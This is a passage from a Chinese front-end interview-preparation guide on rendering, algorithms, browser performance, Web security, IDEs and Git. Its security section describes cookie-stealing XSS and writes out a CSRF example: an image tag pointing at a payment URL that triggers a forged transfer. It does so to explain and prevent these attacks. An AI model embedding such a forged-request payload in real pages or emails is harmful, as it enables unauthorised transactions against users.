首先transition和animation都可以做动效，从语义上来理解，transition是过渡，由一个状态过渡到另一个状态，比如高度100px过渡到200px；而animation是动画，即更专业做动效的，animation有帧的概念，可以设置关键帧keyframe，一个动画可以由多个关键帧多个状态过渡组成，另外animation也包含上面提到的多个属性。 重绘和回流 重绘和回流是面试题经常考的题目，也是性能优化当中应该注意的点，下面笔者简单介绍下。 重绘：指的是当页面中的元素不脱离文档流，而简单地进行样式的变化，比如修改颜色、背景等，浏览器重新绘制样式 回流：指的是处于文档流中 DOM 的尺寸大小、位置或者某些属性发生变化时，导致浏览器重新渲染部分或全部文档的情况 相比之下，回流要比重绘消耗性能开支更大。另外，一些属性的读取也会引起回流，比如读取某个 DOM 的高度和宽度，或者使用getComputedStyle方法。在写代码的时候要避免回流和重绘。比如在笔试中可能会遇见下面的题目： 题目：找出下面代码的优化点，并且优化它 var data = ['string1', 'string2', 'string3']; for(var i = 0; i &lt; data.length; i++)&#123; var dom = document.getElementById('list'); dom.innerHTML += '&lt;li&gt;' + data[i] + '&lt;/li&gt;'; &#125; 复制 上面的代码在循环中每次都获取dom，然后对其内部的 HTML 进行累加li，每次都会操作 DOM 结构，可以改成使用documentFragment或者先遍历组成 HTML 的字符串，最后操作一次innerHTML。 小结 本小节总结了 CSS 和 HTML 常考的知识点，包括 CSS 中比较重要的定位、布局的知识，也介绍了一些 CSS3 的知识点概念和题目，以及 HTML 的语义化。 上一篇：一面 2：JS-Web-API 知识点与高频考题解析下一篇：一面 4：从容应对算法题目 一面 4：从容应对算法题目 由冯·诺依曼机组成我们知道：数据存储和运算是计算机工作的主要内容。程序=数据结构+算法，所以计算机类工程师必须掌握一定的数据结构和算法知识。 知识点梳理 常见的数据结构 栈、队列、链表 集合、字典、散列集 常见算法 递归 排序 枚举 算法复杂度分析 算法思维 分治 贪心 动态规划 高级数据结构 树、图 深度优先和广度优先搜索 本小节会带领大家快速过一遍数据结构和算法，重点讲解一些常考、前端会用到的算法和数据结构。 数据结构 数据结构决定了数据存储的空间和时间效率问题，数据的写入和提取速度要求也决定了应该选择怎样的数据结构。 根据对场景需求的不同，我们设计不同的数据结构，比如： 读得多的数据结构，应该想办法提高数据的读取效率，比如 IP 数据库，只需要写一次，剩下的都是读取； 读写都多的数据结构，要兼顾两者的需求平衡，比如 LRU Cache 算法。 算法是数据加工处理的方式，一定的算法会提升数据的处理效率。比如有序数组的二分查找，要比普通的顺序查找快很多，尤其是在处理大量数据的时候。 数据结构和算法是程序开发的通用技能，所以在任何面试中都可能会遇见。随着近几年 AI、大数据、小游戏越来越火，Web 前端职位难免会跟数据结构和算法打交道，面试中也会出现越来越多的算法题目。学习数据结构和算法也能够帮助我们打开思路，突破技能瓶颈。 前端常遇见的数据结构问题 现在我来梳理下前端常遇见的数据结构： 简单数据结构（必须理解掌握） 有序数据结构：栈、队列、链表，有序数据结构省空间（存储空间小） 无序数据结构：集合、字典、散列表，无序数据结构省时间（读取时间快） 复杂数据结构 树、堆 图 对于简单数据结构，在 ES 中对应的是数组（Array）和对象（Object）。可以想一下，数组的存储是有序的，对象的存储是无序的，但是我要在对象中根据key找到一个值是立即返回的，数组则需要查找的过程。 这里我通过一个真实面试题目来说明介绍下数据结构设计。 题目：使用 ECMAScript（JS）代码实现一个事件类Event，包含下面功能：绑定事件、解绑事件和派发事件。 在稍微复杂点的页面中，比如组件化开发的页面，同一个页面由两三个人来开发，为了保证组件的独立性和降低组件间耦合度，我们往往使用「订阅发布模式」，即组件间通信使用事件监听和派发的方式，而不是直接相互调用组件方法，这就是题目要求写的Event类。 这个题目的核心是一个事件类型对应回调函数的数据设计。为了实现绑定事件，我们需要一个_cache对象来记录绑定了哪些事件。而事件发生的时候，我们需要从_cache中读取出来事件回调，依次执行它们。一般页面中事件派发（读）要比事件绑定（写）多。所以我们设计的数据结构应该尽量地能够在事件发生时，更加快速地找到对应事件的回调函数们，然后执行。 经过这样一番考虑，我简单写了下代码实现： class Event &#123; constructor() &#123; // 存储事件的数据结构 // 为了查找迅速，使用了对象（字典） this._cache = &#123;&#125;; &#125; // 绑定 on(type, callback) &#123; // 为了按类查找方便和节省空间， // 将同一类型事件放到一个数组中 // 这里的数组是队列，遵循先进先出 // 即先绑定的事件先触发 let fns = (this._cache[type] = this._cache[type] || []); if (fns.indexOf(callback) === -1) &#123; fns.push(callback); &#125; return this; &#125; // 触发 trigger(type, data) &#123; let fns = this._cache[type]; if (Array.isArray(fns)) &#123; fns.forEach((fn) =&gt; &#123; fn(data); &#125;); &#125; return this; &#125; // 解绑 off(type, callback) &#123; let fns = this._cache[type]; if (Array.isArray(fns)) &#123; if (callback) &#123; let index = fns.indexOf(callback); if (index !== -1) &#123; fns.splice(index, 1); &#125; &#125; else &#123; //全部清空 fns.length = 0; &#125; &#125; return this; &#125; &#125; // 测试用例 const event = new Event(); event.on('test', (a) =&gt; &#123; console.log(a); &#125;); event.trigger('test', 'hello world'); event.off('test'); event.trigger('test', 'hello world'); 复制 类似于树、堆、图这些高级数据结构，前端一般也不会考查太多，但是它们的查找方法却常考，后面介绍。高级数据应该平时多积累，好好理解，比如理解了堆是什么样的数据结构，在面试中遇见的「查找最大的 K 个数」这类算法问题，就会迎刃而解。 算法的效率是通过算法复杂度来衡量的 算法的好坏可以通过算法复杂度来衡量，算法复杂度包括时间复杂度和空间复杂度两个。时间复杂度由于好估算、好评估等特点，是面试中考查的重点。空间复杂度在面试中考查得不多。 常见的时间复杂度有： 常数阶 O(1) 对数阶 O(logN) 线性阶 O(n) 线性对数阶 O(nlogN) 平方阶 O(n^2) 立方阶 O(n^3) !k次方阶 O(n^k) 指数阶O(2^n) 随着问题规模 n 的不断增大，上述时间复杂度不断增大，算法的执行效率越低。 一般做算法复杂度分析的时候，遵循下面的技巧： 看看有几重循环，一般来说一重就是O(n)，两重就是 O(n^2)，以此类推 如果有二分，则为O(logN) 保留最高项，去除常数项 题目：分析下面代码的算法复杂度（为了方便，我已经在注释中加了代码分析） let i =0; // 语句执行一次 while (i &lt; n) &#123; // 语句执行 n 次 console.log(`Current i is $&#123;i&#125;`); //语句执行 n 次 i++; // 语句执行 n 次 &#125; 复制 根据注释可以得到，算法复杂度为1 + n + n + n = 1 + 3n，去除常数项，为O(n)。 let number = 1; // 语句执行一次 while (number &lt; n) &#123; // 语句执行 logN 次 number *= 2; // 语句执行 logN 次 &#125; 复制 上面代码while的跳出判断条件是number&lt;n，而循环体内number增长速度是(2^n)，所以循环代码实际执行logN次，复杂度为：1 + 2 * logN = O(logN) for (let i = 0; i &lt; n; i++) &#123;// 语句执行 n 次 for (let j = 0; j &lt; n; j++) &#123;// 语句执行 n^2 次 console.log('I am here!'); // 语句执行 n^2 次 &#125; &#125; 复制 上面代码是两个for循环嵌套，很容易得出复杂度为：O(n^2) 人人都要掌握的基础算法 枚举和递归是最最简单的算法，也是复杂算法的基础，人人都应该掌握！枚举相对比较简单，我们重点说下递归。 递归由下面两部分组成： 递归主体，就是要循环解决问题的代码 递归的跳出条件，递归不能一直递归下去，需要完成一定条件后跳出 关于递归有个经典的面试题目是： 实现 JS 对象的深拷贝 什么是深拷贝？ 「深拷贝」就是在拷贝数据的时候，将数据的所有引用结构都拷贝一份。简单的说就是，在内存中存在两个数据结构完全相同又相互独立的数据，将引用型类型进行复制，而不是只复制其引用关系。 分析下怎么做「深拷贝」： 首先假设深拷贝这个方法已经完成，为 deepClone 要拷贝一个数据，我们肯定要去遍历它的属性，如果这个对象的属性仍是对象，继续使用这个方法，如此往复 function deepClone(o1, o2) { for (let k in o2) { if (typeof o2[k] === ‘object’) { o1[k] = {}; deepClone(o1[k], o2[k]); } else { o1[k] = o2[k]; } } } // 测试用例 let obj = { a: 1, b: [1, 2, 3], c: {} }; let emptyObj = Object.create(null); deepClone(emptyObj, obj); console.log(emptyObj.a == obj.a); console.log(emptyObj.b == obj.b); 复制 递归容易造成爆栈，尾部调用可以解决递归的这个问题，Chrome 的 V8 引擎做了尾部调用优化，我们在写代码的时候也要注意尾部调用写法。递归的爆栈问题可以通过将递归改写成枚举的方式来解决，就是通过for或者while来代替递归。 我们在使用递归的时候，要注意做优化，比如下面的题目。 题目：求斐波那契数列（兔子数列） 1,1,2,3,5,8,13,21,34,55,89…中的第 n 项 下面的代码中count记录递归的次数，我们看下两种差异性的代码中的count的值： let count = 0; function fn(n) &#123; let cache = &#123;&#125;; function _fn(n) &#123; if (cache[n]) &#123; return cache[n]; &#125; count++; if (n == 1 || n == 2) &#123; return 1; &#125; let prev = _fn(n - 1); cache[n - 1] = prev; let next = _fn(n - 2); cache[n - 2] = next; return prev + next; &#125; return _fn(n); &#125; let count2 = 0; function fn2(n) &#123; count2++; if (n == 1 || n == 2) &#123; return 1; &#125; return fn2(n - 1) + fn2(n - 2); &#125; console.log(fn(20), count); // 6765 20 console.log(fn2(20), count2); // 6765 13529 复制 快排和二分查找 前端中面试排序和查找的可能性比较小，因为 JS 引擎已经把这些常用操作优化得很好了，可能项目中你费劲写的一个排序方法，都不如Array.sort速度快且代码少。因此，掌握快排和二分查找就可以了。 快排和二分查找都基于一种叫做「分治」的算法思想，通过对数据进行分类处理，不断降低数量级，实现O(logN)（对数级别，比O(n)这种线性复杂度更低的一种）的复杂度。 快速排序 快排大概的流程是： 随机选择数组中的一个数 A，以这个数为基准 其他数字跟这个数进行比较，比这个数小的放在其左边，大的放到其右边 经过一次循环之后，A 左边为小于 A 的，右边为大于 A 的 这时候将左边和右边的数再递归上面的过程 具体代码如下： const Arr = [85, 24, 63, 45, 17, 31, 96, 50]; function quickSort(arr) &#123; if (arr.length &lt;= 1) &#123; return arr; &#125; let pivotIndex = Math.floor(arr.length / 2); let pivot = arr.splice(pivotIndex, 1)[0]; let left = []; let right = []; for (let i = 0; i &lt; arr.length; i++) &#123; if (arr[i] &lt; pivot) &#123; left.push(arr[i]); &#125; else &#123; right.push(arr[i]); &#125; &#125; // 递归 return quickSort(left).concat([pivot], quickSort(right)); &#125; console.log(quickSort(Arr)); 复制 二分查找 二分查找法主要是解决「在一堆有序的数中找出指定的数」这类问题，不管这些数是一维数组还是多维数组，只要有序，就可以用二分查找来优化。 二分查找是一种「分治」思想的算法，大概流程如下： 数组中排在中间的数字 A，与要找的数字比较大小 因为数组是有序的，所以： a) A 较大则说明要查找的数字应该从前半部分查找 b) A 较小则说明应该从查找数字的后半部分查找 这样不断查找缩小数量级（扔掉一半数据），直到找完数组为止 题目：在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 function Find(target, array) &#123; let i = 0; let j = array[i].length - 1; while (i &lt; array.length &amp;&amp; j &gt;= 0) &#123; if (array[i][j] &lt; target) &#123; i++; &#125; else if (array[i][j] &gt; target) &#123; j--; &#125; else &#123; return true; &#125; &#125; return false; &#125; //测试用例 console.log(Find(10, [ [1, 2, 3, 4], [5, 9, 10, 11], [13, 20, 21, 23] ]) ); 复制 另外笔者在面试中遇见过下面的问题： 题目：现在我有一个 1~1000 区间中的正整数，需要你猜下这个数字是几，你只能问一个问题：大了还是小了？问需要猜几次才能猜对？ 拿到这个题目，笔者想到的就是电视上面有个「猜价格」的购物节目，在规定时间内猜对价格就可以把实物抱回家。所以问题就是让面试官不停地回答我猜的数字比这个数字大了还是小了。这就是二分查找！ 猜几次呢？其实这个问题就是个二分查找的算法时间复杂度问题，二分查找的时间复杂度是O(logN)，所以求log1000的解就是猜的次数。我们知道2^10=1024，所以可以快速估算出：log1000约等于 10，最多问 10 次就能得到这个数！ 面试遇见不会的算法问题怎么办 面试的时候，在遇见算法题目的时候，应该揣摩面试官的意图，听好关键词，比如：有序的数列做查找、要求算法复杂度是O(logN)这类一般就是用二分的思想。 一般来说算法题目的解题思路分以下四步： 先降低数量级，拿可以计算出来的情况（数据）来构思解题步骤 根据解题步骤编写程序，优先将特殊情况做好判断处理，比如一个大数组的问题，如果数组为两个数长度的情况 检验程序正确性 是否可以优化（由浅到深），有能力的话可以故意预留优化点，这样可以体现个人技术能力 正则匹配解题 很多算法题目利用 ES 语法的特性来回答更加简单，比如正则匹配就是常用的一种方式。笔者简单通过几个真题来汇总下正则的知识点。 题目：字符串中第一个出现一次的字符 请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符「go」时，第一个只出现一次的字符是「g」。当从该字符流中读出前六个字符「google」时，第一个只出现一次的字符是「l」。 这个如果用纯算法来解答需要遍历字符串，统计每个字符出现的次数，然后按照字符串的顺序来找出第一次出现一次的字符，整个过程比较繁琐，如果用正则就简单多了。 function find(str)&#123; for (var i = 0; i &lt; str.length; i++) &#123; let char = str[i] let reg = new RegExp(char, 'g'); let l = str.match(reg).length if(l===1)&#123; return char &#125; &#125; &#125; 复制 当然，使用indexOf/lastIndexOf也是一个取巧的方式。再来看一个千分位问题。 题目：将1234567 变成 1,234,567，即千分位标注 这个题目可以用算法直接来解，如果候选人使用正则来回答，这样主动展现了自己其他方面的优势，即使不是算法解答出来的，面试官一般也不会太难为他。这道题目可以利用正则的「零宽断言」(?=exp)，意思是它断言自身出现的位置的后面能匹配表达式 exp。数字千分位的特点是，第一个逗号后面数字的个数是3的倍数，正则：/(\\d&#123;3&#125;)+$/；第一个逗号前最多可以有 1~3 个数字，正则：/\\d&#123;1,3&#125;/。加起来就是/\\d&#123;1,3&#125;(\\d&#123;3&#125;)+$/，分隔符要从前往后加。 对于零宽断言的详细介绍可以阅读「零宽断言」这篇文章。 function exchange(num) &#123; num += ''; //转成字符串 if (num.length &lt;= 3) &#123; return num; &#125; num = num.replace(/\\d&#123;1,3&#125;(?=(\\d&#123;3&#125;)+$)/g, (v) =&gt; &#123; console.log(v) return v + ','; &#125;); return num; &#125; console.log(exchange(1234567)); 复制 当然上面讲到的多数是算法题目取巧的方式，下面这个题目是纯正则考查，笔者在面试的过程中碰见过，这里顺便提一下。 题目，请写出下面的代码执行结果 var str = 'google'; var reg = /o/g; console.log(reg.test(str)) console.log(reg.test(str)) console.log(reg.test(str)) 复制 代码执行后，会发现，最后一个不是为true，而是false，这是因为reg这个正则有个g，即global全局的属性，这种情况下lastIndex就发挥作用了，可以看下面的代码执行结果就明白了。 console.log(reg.test(str), reg.lastIndex) console.log(reg.test(str), reg.lastIndex) console.log(reg.test(str), reg.lastIndex) 复制 实际开发中也会犯这样的错误，比如为了减少变量每次都重新定义，会把用到的变量提前定义好，这样在使用的时候容易掉进坑里，比如下面代码： (function()&#123; const reg = /o/g; function isHasO(str)&#123; // reg.lastIndex = 0; 这样就可以避免这种情况 return reg.test(str) &#125; var str = 'google'; console.log(isHasO(str)) console.log(isHasO(str)) console.log(isHasO(str)) &#125;()) 复制 小结 本小节介绍了数据结构和算法的关系，作为普通的前端也应该学习数据结构和算法知识，并且顺带介绍了下正则匹配。具体来说，本小节梳理了以下几部分数据结构和算法知识点： 经常用到的数据结构有哪些，它们的特点有哪些 递归和枚举是最基础的算法，必须牢牢掌握 排序里面理解并掌握快速排序算法，其他排序算法可以根据个人实际情况大概了解 有序查找用二分查找 遇见不会的算法问题，先缩小数量级，然后分析推导 当然算法部分还有很多知识，比如动态规划这些算法思想，还有图和树常用到的广度优先搜索和深度优先搜索。这些知识在前端面试和项目中遇见得不多，感兴趣的读者可以在梳理知识点的时候根据个人情况自行决定是否复习。 上一篇：一面 3：CSS-HTML 知识点与高频考题解析下一篇：一面 5：浏览器相关知识点与高频考题解析 一面 5：浏览器相关知识点与高频考题解析 Web 前端工程师写的页面要跑在浏览器里面，所以面试中也会出现很多跟浏览器相关的面试题目。 知识点梳理**** 浏览器加载页面和渲染过程 性能优化 Web 安全 本小节会从浏览器的加载过程开始讲解，然后介绍如何进行性能优化，最后介绍下 Web 开发中常见的安全问题和预防。 加载页面和渲染过程 可将加载过程和渲染过程分开说。回答问题的时候，关键要抓住核心的要点，把要点说全面，稍加解析即可，简明扼要不拖沓。 题目：浏览器从加载页面到渲染页面的过程 加载过程 要点如下： 浏览器根据 DNS 服务器得到域名的 IP 地址 向这个 IP 的机器发送 HTTP 请求 服务器收到、处理并返回 HTTP 请求 浏览器得到返回内容 例如在浏览器输入https://juejin.im/timeline，然后经过 DNS 解析，juejin.im对应的 IP 是36.248.217.149（不同时间、地点对应的 IP 可能会不同）。然后浏览器向该 IP 发送 HTTP 请求。 server 端接收到 HTTP 请求，然后经过计算（向不同的用户推送不同的内容），返回 HTTP 请求，返回的内容如下： ![](data:image/svg+xml;utf8,) 其实就是一堆 HMTL 格式的字符串，因为只有 HTML 格式浏览器才能正确解析，这是 W3C 标准的要求。接下来就是浏览器的渲染过程。 渲染过程 要点如下： 根据 HTML 结构生成 DOM 树 根据 CSS 生成 CSSOM 将 DOM 和 CSSOM 整合形成 RenderTree 根据 RenderTree 开始渲染和展示 遇到&lt;script&gt;时，会执行并阻塞渲染 上文中，浏览器已经拿到了 server 端返回的 HTML 内容，开始解析并渲染。最初拿到的内容就是一堆字符串，必须先结构化成计算机擅长处理的基本数据结构，因此要把 HTML 字符串转化成 DOM 树 —— 树是最基本的数据结构之一。 解析过程中，如果遇到&lt;link href=&quot;...&quot;&gt;和&lt;script src=&quot;...&quot;&gt;这种外链加载 CSS 和 JS 的标签，浏览器会异步下载，下载过程和上文中下载 HTML 的流程一样。只不过，这里下载下来的字符串是 CSS 或者 JS 格式的。 浏览器将 CSS 生成 CSSOM，再将 DOM 和 CSSOM 整合成 RenderTree ，然后针对 RenderTree 即可进行渲染了。大家可以想一下，有 DOM 结构、有样式，此时就能满足渲染的条件了。另外，这里也可以解释一个问题 —— 为何要将 CSS 放在 HTML 头部？—— 这样会让浏览器尽早拿到 CSS 尽早生成 CSSOM，然后在解析 HTML 之后可一次性生成最终的 RenderTree，渲染一次即可。如果 CSS 放在 HTML 底部，会出现渲染卡顿的情况，影响性能和体验。 最后，渲染过程中，如果遇到&lt;script&gt;就停止渲染，执行 JS 代码。因为浏览器渲染和 JS 执行共用一个线程，而且这里必须是单线程操作，多线程会产生渲染 DOM 冲突。待&lt;script&gt;内容执行完之后，浏览器继续渲染。最后再思考一个问题 —— 为何要将 JS 放在 HTML 底部？—— JS 放在底部可以保证让浏览器优先渲染完现有的 HTML 内容，让用户先看到内容，体验好。另外，JS 执行如果涉及 DOM 操作，得等待 DOM 解析完成才行，JS 放在底部执行时，HTML 肯定都解析成了 DOM 结构。JS 如果放在 HTML 顶部，JS 执行的时候 HTML 还没来得及转换为 DOM 结构，可能会报错。 关于浏览器整个流程，百度的多益大神有更加详细的文章，推荐阅读下：《从输入 URL 到页面加载完成的过程中都发生了什么事情？ 》。 性能优化 性能优化的题目也是面试常考的，这类题目有很大的扩展性，能够扩展出来很多小细节，而且对个人的技术视野和业务能力有很大的挑战。这部分笔者会重点讲下常用的性能优化方案。 题目：总结前端性能优化的解决方案 优化原则和方向 性能优化的原则是以更好的用户体验为标准，具体就是实现下面的目标： 多使用内存、缓存或者其他方法 减少 CPU 和GPU 计算，更快展现 优化的方向有两个： 减少页面体积，提升网络加载 优化页面渲染 减少页面体积，提升网络加载 静态资源的压缩合并（JS 代码压缩合并、CSS 代码压缩合并、雪碧图） 静态资源缓存（资源名称加 MD5 戳） 使用 CDN 让资源加载更快 优化页面渲染 CSS 放前面，JS 放后面 懒加载（图片懒加载、下拉加载更多） 减少DOM 查询，对 DOM 查询做缓存 减少DOM 操作，多个操作尽量合并在一起执行（DocumentFragment） 事件节流 尽早执行操作（DOMContentLoaded） 使用 SSR 后端渲染，数据直接输出到 HTML 中，减少浏览器使用 JS 模板渲染页面 HTML 的时间 详细解释 静态资源的压缩合并 如果不合并，每个都会走一遍之前介绍的请求过程 &lt;script src=&quot;a.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;b.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;c.js&quot;&gt;&lt;/script&gt; 复制 如果合并了，就只走一遍请求过程 &lt;script src=&quot;abc.js&quot;&gt;&lt;/script&gt; 复制 静态资源缓存 通过链接名称控制缓存 &lt;script src=&quot;abc_1.js&quot;&gt;&lt;/script&gt; 复制 只有内容改变的时候，链接名称才会改变 &lt;script src=&quot;abc_2.js&quot;&gt;&lt;/script&gt; 复制 这个名称不用手动改，可通过前端构建工具根据文件内容，为文件名称添加 MD5 后缀。 使用 CDN 让资源加载更快 CDN 会提供专业的加载优化方案，静态资源要尽量放在 CDN 上。例如： &lt;script src=&quot;https://cdn.bootcss.com/zepto/1.0rc1/zepto.min.js&quot;&gt;&lt;/script&gt; 复制 使用 SSR 后端渲染 可一次性输出 HTML 内容，不用在页面渲染完成之后，再通过 Ajax 加载数据、再渲染。例如使用 smarty、Vue SSR 等。 CSS 放前面，JS 放后面 上文讲述浏览器渲染过程时已经提过，不再赘述。 懒加载 一开始先给为 src 赋值成一个通用的预览图，下拉时候再动态赋值成正式的图片。如下，preview.png是预览图片，比较小，加载很快，而且很多图片都共用这个preview.png，加载一次即可。待页面下拉，图片显示出来时，再去替换src为data-realsrc的值。 &lt;img src=&quot;preview.png&quot; data-realsrc=&quot;abc.png&quot;/&gt; 复制 另外，这里为何要用data-开头的属性值？—— 所有 HTML 中自定义的属性，都应该用data-开头，因为data-开头的属性浏览器渲染的时候会忽略掉，提高渲染性能。 DOM 查询做缓存 两段代码做一下对比： var pList = document.getElementsByTagName('p') // 只查询一个 DOM ，缓存在 pList 中了 var i for (i = 0; i &lt; pList.length; i++) &#123; &#125; 复制 var i for (i = 0; i &lt; document.getElementsByTagName('p').length; i++) &#123; // 每次循环，都会查询 DOM ，耗费性能 &#125; 复制 总结：DOM 操作，无论查询还是修改，都是非常耗费性能的，应尽量减少。 合并 DOM 插入 DOM 操作是非常耗费性能的，因此插入多个标签时，先插入 Fragment 然后再统一插入 DOM。 var listNode = document.getElementById('list') // 要插入 10 个 li 标签 var frag = document.createDocumentFragment(); var x, li; for(x = 0; x &lt; 10; x++) &#123; li = document.createElement(&quot;li&quot;); li.innerHTML = &quot;List item &quot; + x; frag.appendChild(li); // 先放在 frag 中，最后一次性插入到 DOM 结构中。 &#125; listNode.appendChild(frag); 复制 事件节流 例如要在文字改变时触发一个 change 事件，通过 keyup 来监听。使用节流。 var textarea = document.getElementById('text') var timeoutId textarea.addEventListener('keyup', function () &#123; if (timeoutId) &#123; clearTimeout(timeoutId) &#125; timeoutId = setTimeout(function () &#123; // 触发 change 事件 &#125;, 100) &#125;) 复制 尽早执行操作 window.addEventListener('load', function () &#123; // 页面的全部资源加载完才会执行，包括图片、视频等 &#125;) document.addEventListener('DOMContentLoaded', function () &#123; // DOM 渲染完即可执行，此时图片、视频还可能没有加载完 &#125;) 复制 性能优化怎么做 上面提到的都是性能优化的单个点，性能优化项目具体实施起来，应该按照下面步骤推进： 建立性能数据收集平台，摸底当前性能数据，通过性能打点，将上述整个页面打开过程消耗时间记录下来 分析耗时较长时间段原因，寻找优化点，确定优化目标 开始优化 通过数据手机平台记录优化效果 不断调整优化点和预期目标，循环2~4步骤 性能优化是个长期的事情，不是一蹴而就的，应该本着先摸底、再分析、后优化的原则逐步来做。 Web 安全 题目：前端常见的安全问题有哪些？ Web 前端的安全问题，能回答出下文的两个问题，这个题目就能基本过关了。开始之前，先说一个最简单的攻击方式 —— SQL 注入。 上学的时候就知道有一个「SQL注入」的攻击方式。例如做一个系统的登录界面，输入用户名和密码，提交之后，后端直接拿到数据就拼接 SQL 语句去查询数据库。如果在输入时进行了恶意的 SQL 拼装，那么最后生成的 SQL 就会有问题。但是现在稍微大型一点的系统，都不会这么做，从提交登录信息到最后拿到授权，要经过层层的验证。因此，SQL 注入都只出现在比较低端小型的系统上。 XSS（Cross Site Scripting，跨站脚本攻击） 这是前端最常见的攻击方式，很多大型网站（如 Facebook）都被 XSS 攻击过。 举一个例子，我在一个博客网站正常发表一篇文章，输入汉字、英文和图片，完全没有问题。但是如果我写的是恶意的 JS 脚本，例如获取到document.cookie然后传输到自己的服务器上，那我这篇博客的每一次浏览都会执行这个脚本，都会把访客 cookie 中的信息偷偷传递到我的服务器上来。 其实原理上就是黑客通过某种方式（发布文章、发布评论等）将一段特定的 JS 代码隐蔽地输入进去。然后别人再看这篇文章或者评论时，之前注入的这段 JS 代码就执行了。JS 代码一旦执行，那可就不受控制了，因为它跟网页原有的 JS 有同样的权限，例如可以获取 server 端数据、可以获取 cookie 等。于是，攻击就这样发生了。 XSS的危害 XSS 的危害相当大，如果页面可以随意执行别人不安全的 JS 代码，轻则会让页面错乱、功能缺失，重则会造成用户的信息泄露。 比如早些年社交网站经常爆出 XSS 蠕虫，通过发布的文章内插入 JS，用户访问了感染不安全 JS 注入的文章，会自动重新发布新的文章，这样的文章会通过推荐系统进入到每个用户的文章列表面前，很快就会造成大规模的感染。 还有利用获取 cookie 的方式，将 cookie 传入入侵者的服务器上，入侵者就可以模拟 cookie 登录网站，对用户的信息进行篡改。 XSS的预防 那么如何预防 XSS 攻击呢？—— 最根本的方式，就是对用户输入的内容进行验证和替换，需要替换的字符有： &amp; 替换为：&amp;amp; &lt; 替换为：&amp;lt; &gt; 替换为：&amp;gt; ” 替换为：&amp;quot; ‘ 替换为：&amp;#x27; / 替换为：&amp;#x2f; 复制 替换了这些字符之后，黑客输入的攻击代码就会失效，XSS 攻击将不会轻易发生。 除此之外，还可以通过对 cookie 进行较强的控制，比如对敏感的 cookie 增加http-only限制，让 JS 获取不到 cookie 的内容。 CSRF（Cross-site request forgery，跨站请求伪造） CSRF 是借用了当前操作者的权限来偷偷地完成某个操作，而不是拿到用户的信息。 例如，一个支付类网站，给他人转账的接口是http://buy.com/pay?touid=999&amp;money=100，而这个接口在使用时没有任何密码或者 token 的验证，只要打开访问就直接给他人转账。一个用户已经登录了http://buy.com，在选择商品时，突然收到一封邮件，而这封邮件正文有这么一行代码&lt;img src=&quot;http://buy.com/pay?touid=999&amp;money=100&quot;/&gt;，他访问了邮件之后，其实就已经完成了购买。 CSRF 的发生其实是借助了一个 cookie 的特性。我们知道，登录了http://buy.com之后，cookie 就会有登录过的标记了，此时请求http://buy.com/pay?touid=999&amp;money=100是会带着 cookie 的，因此 server 端就知道已经登录了。而如果在http://buy.com去请求其他域名的 API 例如http://abc.com/api时，是不会带 cookie 的，这是浏览器的同源策略的限制。但是 —— 此时在其他域名的页面中，请求http://buy.com/pay?touid=999&amp;money=100，会带着buy.com的 cookie ，这是发生 CSRF 攻击的理论基础。 预防 CSRF 就是加入各个层级的权限验证，例如现在的购物网站，只要涉及现金交易，肯定要输入密码或者指纹才行。除此之外，敏感的接口使用POST请求而不是GET也是很重要的。 小结 本小节总结了前端运行环境（即浏览器）的一些常考查知识点，包括页面加载过程、如何性能优化以及需要注意的安全问题。 上一篇：一面 4：从容应对算法题目下一篇：一面 6：开发环境相关知识点与高频考题解析 一面 6：开发环境相关知识点与高频考题解析 工程师的开发环境决定其开发效率，常用的开发环境配置也是面试考查点之一。 知识点梳理 IDE Git Linux 基础命令 前端构建工具 调试方法 本小节会重点介绍 Git 的基本用法、代码部署和开发中常用的 Linux 命令，然后以 webpack 为例介绍下前端构建工具，最后介绍怎么抓包解决线上问题。这些都是日常开发和面试中常用到的知识。 IDE 题目：你平时都使用什么 IDE 编程？有何提高效率的方法？ 前端最常用的 IDE 有 Webstorm、Sublime、Atom 和 VSCode，我们可以分别去它们的官网看一下。 Webstorm 是最强大的编辑器，因为它拥有各种强大的插件和功能，但是我没有用过，因为它收费。不是我舍不得花钱，而是因为我觉得免费的 Sublime 已经够我用了。跟面试官聊到 Webstorm 的时候，没用过没事儿，但一定要知道它：第一，强大；第二，收费。 Sublime 是我日常用的编辑器，第一它免费，第二它轻量、高效，第三它插件非常多。用 Sublime 一定要安装各种插件配合使用，可以去网上搜一下“sublime”常用插件的安装以及用法，还有它的各种快捷键，并且亲自使用它。这里就不一一演示了，网上的教程也很傻瓜式。 Atom 是 GitHub 出品的编辑器，跟 Sublime 差不多，免费并且插件丰富，而且跟 Sublime 相比风格上还有些小清新。但是我用过几次就不用了，因此它打开的时候会比较慢，卡一下才打开。当然总体来说也是很好用的，只是个人习惯问题。 VSCode 是微软出品的轻量级（相对于 Visual Studio 来说）编辑器，微软做 IDE 那是出了名的好，出了名的大而全，因此 VSCode 也有上述 Sublime 和 Atom 的各种优点，但是我也是因为个人习惯问题（本人不愿意尝试没有新意的新东西），用过几次就不用了。 总结一下： 如果你要走大牛、大咖、逼格的路线，就用 Webstorm 如果你走普通、屌丝、低调路线，就用 Sublime 如果你走小清新、个性路线，就用 VSCode 或者 Atom 如果你面试，最好有一个用的熟悉，其他都会一点 最后注意：千万不要说你使用 Dreamweaver 或者 notepad++ 写前端代码，会被人鄙视的。如果你不做 .NET 也不要用 Visual Studio ，不做 Java 也不要用 Eclipse。 Git 你此前做过的项目一定要用过 Git，而且必须是命令行，如果没用过，你自己也得恶补一下。对 Git 的基本应用比较熟悉的同学，可以跳过这一部分了。macOS 自带 Git，Windows 需要安装 Git 客户端，去 Git 官网 下载即可。 国内比较好的 Git 服务商有 coding.net，国外有大名鼎鼎的 GitHub，但是有时会有网络问题，因此建议大家注册一个 coding.net 账号然后创建项目，来练练手。 题目：常用的 Git 命令有哪些？如何使用 Git 多人协作开发？ 常用的 Git 命令 首先，通过git clone &lt;项目远程地址&gt;下载下来最新的代码，例如git clone git@git.coding.net:username/project-name.git，默认会下载master分支。 然后修改代码，修改过程中可以通过git status看到自己的修改情况，通过git diff &lt;文件名&gt;可查阅单个文件的差异。 最后，将修改的内容提交到远程服务器，做如下操作 git add . git commit -m &quot;xxx&quot; git push origin master 复制 如果别人也提交了代码，你想同步别人提交的内容，执行git pull origin master即可。 如何多人协作开发 多人协作开发，就不能使用master分支了，而是要每个开发者单独拉一个分支，使用git checkout -b 